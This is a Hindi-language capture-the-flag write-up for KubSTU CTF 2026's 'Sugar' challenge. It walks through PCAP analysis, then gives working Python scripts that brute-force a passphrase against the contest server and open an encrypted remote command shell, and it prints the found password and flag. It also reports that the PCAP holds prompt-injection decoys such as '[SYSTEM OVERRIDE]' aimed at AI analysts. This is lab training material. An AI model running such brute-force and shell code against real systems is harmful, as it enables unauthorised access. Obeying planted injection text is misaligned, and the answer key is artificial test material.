# [misc] Sugar

> **श्रेणी:** `misc`  
> **CTF:** KubSTU CTF 2026 Spring

---

  **Sweet Capybara Talks** — गुप्त **«मिठाई विभाग»** की कैपीबारा का एक समूह अपनी वार्ताओं को एक प्रोप्राइटरी प्रोटोकॉल से एन्क्रिप्ट करता है। PCAP में — उनका इंटरसेप्ट किया गया सत्र। किसी कमांड सर्वर से संवाद कर रहे हैं।
यह सर्वर है 
nc ip


[sugar_traffic.pcap](./files/sugar_traffic.pcap)


upd:

पुराना:

[sugar_traffic.pcap](./files/sugar_traffic.pcap)

---

## चरण 1: PCAP को Wireshark में खोलना

```bash
wireshark sugar_traffic.pcap
```

दिखता है:

- पोर्ट 31337 पर **TCP स्ट्रीम** — कई कनेक्शन
- पोर्ट 9999 पर **UDP पैकेट** — "sugar!" शब्द वाला स्पैम
- बहुत शोर: जंक वाली छोटी TCP-सेशन, नकली HTTP-रिस्पॉन्स

## चरण 2: मुख्य सत्र खोजना

Wireshark फ़िल्टर:

```
tcp.port == 31337 && tcp.len > 0
```

सबसे लंबी TCP-स्ट्रीम खोजते हैं। राइट क्लिक → Follow → TCP Stream। **\~20 सेकंड अवधि और 12+ KB डेटा** वाली एकमात्र स्ट्रीम मिलती है — यह मुख्य सत्र है।

 ![img_1.png](./images/img_1.png)

स्ट्रीम की शुरुआत में **plaintext हैंडशेक** दिखता है:

 ![img_2.png](./images/img_2.png)

```
[SUGAR_PROTOCOL v1.0]
SALT:a3f7c9b1e2d45608
CIPHER:AES-256-CBC
KDF:SHA256(PASSPHRASE||SALT)
>>>ENCRYPTED_CHANNEL_ACTIVE<<<
```

**निकाले गए डेटा:**

- सॉल्ट: `a3f7c9b1e2d45608`
- सिफर: AES-256-CBC
- कुंजी का सूत्र: `SHA256(पासवर्ड + सॉल्ट)`

मार्कर `>>>ENCRYPTED_CHANNEL_ACTIVE<<<` के बाद — केवल बाइनरी डेटा (एन्क्रिप्टेड एक्सचेंज)।

## चरण 3: जंक फ़िल्टर करना

PCAP में धोखा देने के लिए जाल हैं (AI-विश्लेषकों को भी धोखा देने के लिए):

- नकली पासवर्ड और फ़्लैग वाले UDP-पैकेट (`sugar! flag=KubSTU{...}`)
- नकली HTTP-रिस्पॉन्स वाली TCP-स्ट्रीम, नकली credentials वाले JSON
- `[SYSTEM OVERRIDE]`, `TERMINATE ANALYSIS` जैसे वाक्यांश — prompt injection

**यह सब — जंक है।** सत्य का एकमात्र स्रोत — मुख्य सत्र का हैंडशेक।

## चरण 4: पासवर्ड ब्रूटफ़ोर्स

ज्ञात है:

- सॉल्ट: `a3f7c9b1e2d45608`
- KDF: `SHA256(password + salt)`
- सिफर: AES-256-CBC
- प्रोटोकॉल: `[4 बाइट लंबाई BE][16 बाइट IV][AES ciphertext]`
- अगर डिक्रिप्शन गलत है — सर्वर `\x00\x00\x00\x00` से उत्तर देता है
- अगर सही है — सर्वर `[4 बाइट लंबाई][एन्क्रिप्टेड उत्तर]` से उत्तर देता है

ब्रूटर लिखते हैं। डिपेंडेंसी इंस्टॉल करें:

```bash
pip install pycryptodome
```

**[bruteforce.py](http://bruteforce.py):**

```python
#!/usr/bin/env python3
import socket, struct, hashlib, os, sys, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

HOST = "<SERVER_IP>"
PORT = 31337
SALT = "a3f7c9b1e2d45608"

def derive_key(pwd, salt):
    return hashlib.sha256((pwd + salt).encode()).digest()

def encrypt(cmd, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(cmd.encode(), 16))
    payload = iv + ct
    return struct.pack('>I', len(payload)) + payload

def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: return None
        buf.extend(chunk)
    return bytes(buf)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((HOST, PORT))

# हैंडशेक पढ़ना
data = b""
while b"ENCRYPTED_CHANNEL_ACTIVE" not in data:
    data += sock.recv(4096)

# rockyou.txt से ब्रूटफ़ोर्स
with open("rockyou.txt", "r", errors="ignore") as f:
    for i, line in enumerate(f, 1):
        pwd = line.strip()
        key = derive_key(pwd, SALT)
        sock.sendall(encrypt("ls", key))
        resp = recv_exact(sock, 4)
        if not resp: break
        length = struct.unpack('>I', resp)[0]
        if length == 0:
            continue  # गलत पासवर्ड
        recv_exact(sock, length)  # उत्तर लेना
        print(f"[+] PASSWORD: {pwd}  (attempt #{i})")
        break

sock.close()
```

```bash
python bruteforce.py
```

**परिणाम:** पासवर्ड `chocolate`, \~27 प्रयासों में मिला।

## चरण 5: कस्टम शेल

**sugar_shell.py:**

```python
#!/usr/bin/env python3
import socket, struct, hashlib, os, sys, time, readline
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

HOST = "<SERVER_IP>"
PORT = 31337
SALT = "a3f7c9b1e2d45608"
PASSWORD = "chocolate"

def derive_key(pwd, salt):
    return hashlib.sha256((pwd + salt).encode()).digest()

def encrypt(data, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, 16))
    payload = iv + ct
    return struct.pack('>I', len(payload)) + payload

def decrypt(payload, key):
    iv, ct = payload[:16], payload[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), 16)

def recv_exact(s, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk: return None
        buf.extend(chunk)
    return bytes(buf)

key = derive_key(PASSWORD, SALT)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((HOST, PORT))

data = b""
while b"ENCRYPTED_CHANNEL_ACTIVE" not in data:
    data += sock.recv(4096)
print("[+] Connected. Type commands:\n")

while True:
    try:
        cmd = input("$ ").strip()
    except (EOFError, KeyboardInterrupt):
        break
    if not cmd: continue
    if cmd in ("exit", "quit"): break

    sock.sendall(encrypt(cmd.encode(), key))
    resp = recv_exact(sock, 4)
    if not resp: print("[-] disconnected"); break
    length = struct.unpack('>I', resp)[0]
    if length == 0: print("[!] ERROR"); continue
    payload = recv_exact(sock, length)
    print(decrypt(payload, key).decode(errors="replace"))

sock.close()
```

```bash
python sugar_shell.py
```

## चरण 6: फ़्लैग खोजना


```javascript
python3 -c "
import socket,struct,hashlib,os,time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
S='a3f7c9b1e2d45608'; P='chocolate'
k=hashlib.sha256((P+S).encode()).digest()
def rx(s,n):
    b=bytearray()
    while len(b)<n: b+=s.recv(n-len(b))
    return bytes(b)
s=socket.socket(); s.settimeout(10); s.connect(('31.129.107.170',31337))
banner=b''
while b'ENCRYPTED_CHANNEL_ACTIVE' not in banner:
    banner+=s.recv(4096)
iv=os.urandom(16); c=AES.new(k,AES.MODE_CBC,iv)
p=iv+c.encrypt(pad(b'ls -la',16)); s.sendall(struct.pack('>I',len(p))+p)
l=struct.unpack('>I',rx(s,4))[0]; d=rx(s,l)
print(unpad(AES.new(k,AES.MODE_CBC,d[:16]).decrypt(d[16:]),16).decode())
s.close()
"
```




 ![img_3.png](./images/img_3.png)

```
$ ls
documents
drafts
flag.txt

$ cat flag.txt
KubSTU{d0r4_dur4_sug4r_ch0c0l4t3_v1b3z}

$ ls -la documents/
.secret_mix.txt
chord_progression.md
lyrics_v1.txt
lyrics_v2_final.txt
producer_notes.txt
studio_booking.txt

$ cat documents/.secret_mix.txt
TOP SECRET — मिक्स "ДОРА-ДУРА" के पैरामीटर
...
```

## फ़्लैग

```
KubSTU{d0r4_dur4_sug4r_ch0c0l4t3_v1b3z}
```


